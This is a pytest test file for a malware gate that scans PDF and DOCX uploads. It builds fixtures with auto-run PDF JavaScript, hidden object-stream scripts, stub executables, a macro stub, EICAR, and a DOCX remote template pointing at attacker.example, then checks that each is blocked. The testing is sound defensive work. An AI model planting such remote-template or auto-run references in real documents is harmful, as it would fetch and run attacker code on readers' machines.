import builtins

import fitz
import pytest

from report_to_json.security import gate as gate_mod
from report_to_json.security import GateUnavailableError, MalwareDetectedError, malware_gate, scan_file
from report_to_json.security.filetype import classify_embedded_file, classify_txt_content
from report_to_json.security.ooxml import inspect_ooxml

from conftest import REPORT_PAGES, eicar, make_docx, make_pdf  # noqa: E402

OLE = b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1"
TEMPLATE_REL = ('<Relationships><Relationship Id="rId1" '
                'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" '
                'Target="http://attacker.example/t.dotm" TargetMode="External"/></Relationships>')
HYPERLINK_REL = ('<Relationships><Relationship Id="rId9" '
                 'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" '
                 'Target="https://owasp.org" TargetMode="External"/></Relationships>')


def _pdf_with_openaction_js(path, object_streams=False):
    doc = fitz.open()
    doc.new_page().insert_text((50, 60), "Invoice")
    xref = doc.get_new_xref()
    doc.update_object(xref, "<< /Type /Action /S /JavaScript /JS (app.alert(1)) >>")
    doc.xref_set_key(doc.pdf_catalog(), "OpenAction", f"{xref} 0 R")
    doc.save(str(path), garbage=3, deflate=True, use_objstms=1 if object_streams else 0)
    doc.close()
    return path


def test_clean_pdf_passes(report_pdf):
    result = malware_gate(report_pdf)
    assert result["verdict"] == "CLEAN"
    assert len(result["sha256"]) == 64


def test_autorun_javascript_pdf_is_blocked(tmp_path):
    with pytest.raises(MalwareDetectedError) as exc:
        malware_gate(_pdf_with_openaction_js(tmp_path / "js.pdf"))
    assert exc.value.scan_result["verdict"] == "MALICIOUS"
    assert "PDF_AutoRun_JavaScript" in {m["rule"] for m in exc.value.scan_result["rule_matches"]}


def test_javascript_hidden_in_object_stream_is_found(tmp_path):
    path = _pdf_with_openaction_js(tmp_path / "objstm.pdf", object_streams=True)
    assert b"/JavaScript" not in path.read_bytes()  # compressed away from a raw-bytes scan
    assert scan_file(path)["verdict"] == "MALICIOUS"


def test_pdf_with_executable_attachment_is_malicious(tmp_path):
    path = make_pdf(tmp_path / "att.pdf", REPORT_PAGES[:1])
    doc = fitz.open(str(path))
    doc.embfile_add("tool.exe", b"MZ" + b"\x00" * 200, filename="tool.exe")
    doc.saveIncr()
    doc.close()
    assert scan_file(path)["verdict"] == "MALICIOUS"


def test_eicar_signature_is_recognised():
    # Scanned in memory: real-time anti-virus deletes an EICAR file as soon as it is written.
    [match] = gate_mod._match(gate_mod._rules(), ("raw", "raw", b"prefix " + eicar()))
    assert (match["rule"], match["verdict"]) == ("EICAR_Test_File", "TEST_SIGNATURE_DETECTED")


def test_test_signatures_pass_unless_configured_to_block(monkeypatch, report_pdf):
    fake = {"file": str(report_pdf), "verdict": "TEST_SIGNATURE_DETECTED", "rule_matches": [], "checks": []}
    monkeypatch.setattr(gate_mod, "scan_file", lambda path, rules=None: fake)
    assert malware_gate(report_pdf)["verdict"] == "TEST_SIGNATURE_DETECTED"
    with pytest.raises(MalwareDetectedError):
        malware_gate(report_pdf, block_on=("TEST_SIGNATURE_DETECTED",))


def test_fake_pdf_is_suspicious(tmp_path):
    path = tmp_path / "fake.pdf"
    path.write_bytes(b"MZ not really a pdf")
    assert scan_file(path)["verdict"] in ("SUSPICIOUS", "MALICIOUS")


def test_docx_quoting_payload_strings_in_text_is_clean(tmp_path):
    # Pentest reports quote payloads; text content must not trip the gate.
    path = make_docx(tmp_path / "report.docx", {"word/_rels/document.xml.rels": HYPERLINK_REL})
    assert malware_gate(path)["verdict"] == "CLEAN"


def test_docx_macro_is_blocked(tmp_path):
    path = make_docx(tmp_path / "macro.docx", {"word/vbaProject.bin": OLE + b"\x00" * 64 + b"_VBA_PROJECT"})
    with pytest.raises(MalwareDetectedError):
        malware_gate(path)


def test_docx_remote_template_is_blocked(tmp_path):
    path = make_docx(tmp_path / "tmpl.docx", {"word/_rels/settings.xml.rels": TEMPLATE_REL})
    report = inspect_ooxml(str(path))
    assert report["external_ref"] == "FOUND" and report["recommendation"] == "BLOCK"
    with pytest.raises(MalwareDetectedError):
        malware_gate(path)


def test_docx_embedded_executable_is_malicious(tmp_path):
    path = make_docx(tmp_path / "exe.docx", {"word/embeddings/oleObject1.bin": b"MZ" + b"\x00" * 60 + b"PE\x00\x00"})
    assert scan_file(path)["verdict"] == "MALICIOUS"


def test_docx_benign_embedded_object_only_needs_sanitising(tmp_path):
    path = make_docx(tmp_path / "ole.docx", {"word/embeddings/Sheet1.bin": OLE + b"\x00" * 64})
    assert inspect_ooxml(str(path))["recommendation"] == "SANITIZE"
    assert scan_file(path)["verdict"] == "CLEAN"


def test_gate_fails_closed_without_yara(monkeypatch, report_pdf):
    real_import = builtins.__import__

    def no_yara(name, *args, **kwargs):
        if name == "yara":
            raise ImportError("simulated")
        return real_import(name, *args, **kwargs)

    monkeypatch.setattr(gate_mod, "_RULES", None)
    monkeypatch.setattr(builtins, "__import__", no_yara)
    with pytest.raises(GateUnavailableError):
        malware_gate(report_pdf)


def test_filetype_classification():
    assert classify_embedded_file(b"MZ\x90\x00", "payload.bin") == ("DANGEROUS", "application/x-msdownload")
    assert classify_embedded_file(b"\x89PNG\r\n\x1a\n....", "shot.png")[0] == "SAFE"
    assert classify_embedded_file(bytes(range(256)), "blob.bin")[0] == "UNKNOWN"  # never SAFE by default


def test_txt_classifier(tmp_path):
    good = tmp_path / "notes.txt"
    good.write_text("Finding description", encoding="utf-8")
    bad = tmp_path / "fake.txt"
    bad.write_bytes(b"MZ\x90\x00\x03")
    assert classify_txt_content(str(good))["recommendation"] == "PASS"
    assert classify_txt_content(str(bad))["recommendation"] == "BLOCK"
